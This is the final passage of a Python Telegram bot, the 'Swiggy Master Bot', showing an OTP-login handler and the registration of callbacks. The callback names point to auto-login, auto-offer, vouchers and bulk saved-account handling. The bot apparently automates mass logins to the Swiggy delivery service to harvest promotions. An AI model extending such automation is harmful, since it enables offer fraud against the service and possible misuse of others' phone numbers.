        await msg.reply_text(f"📱 Processing `{phone}`...", parse_mode=ParseMode.MARKDOWN)
        loop = asyncio.get_event_loop()
        ok   = await loop.run_in_executor(None, swiggy_send_login_otp, phone)
        if ok:
            await msg.reply_text(f"✅ OTP bhej diya `{phone}` pe! Ab OTP aane ka wait karo.", parse_mode=ParseMode.MARKDOWN)
        else:
            await msg.reply_text(f"❌ OTP send failed `{phone}`.", parse_mode=ParseMode.MARKDOWN)

    else:
        await msg.reply_text(
            "Menu se option select karo 👇",
            reply_markup=InlineKeyboardMarkup([[
                InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")
            ]]),
        )


# ════════════════════════════════════════════════════
#  MAIN
# ════════════════════════════════════════════════════

def main():
    init_db()
    app = Application.builder().token(BOT_TOKEN).build()

    # Commands
    app.add_handler(CommandHandler("start", cmd_start))

    # Callbacks
    cbs = {
        "main_menu":        cb_main_menu,
        "stats":            cb_stats,
        "panels":           cb_panels,
        "panel_add_link":   cb_panel_add_link,
        "panel_add_file":   cb_panel_add_file,
        "panel_list":       cb_panel_list,
        "panel_clear":      cb_panel_clear,
        "panel_scan":       cb_panel_scan,
        "auto_mode":        cb_auto_mode,
        "auto_login":       cb_auto_login,
        "auto_delete":      cb_auto_delete,
        "auto_offer":       cb_auto_offer,
        "auto_all":         cb_auto_all,
        "offer_night":      cb_offer_night,
        "offer_breakfast":  cb_offer_breakfast,
        "saved_accounts":   cb_saved_accounts,
        "delete_accounts":  cb_delete_accounts,
        "delete_all_saved": cb_delete_all_saved,
        "import_json":      cb_import_json,
        "export_json":      cb_export_json,
        "vouchers":         cb_vouchers,
        "manual_num":       cb_manual_num,
    }
    for data, handler in cbs.items():
        app.add_handler(CallbackQueryHandler(handler, pattern=f"^{data}$"))

    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, msg_handler))

    print("🤖 Swiggy Master Bot chalu hai...")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
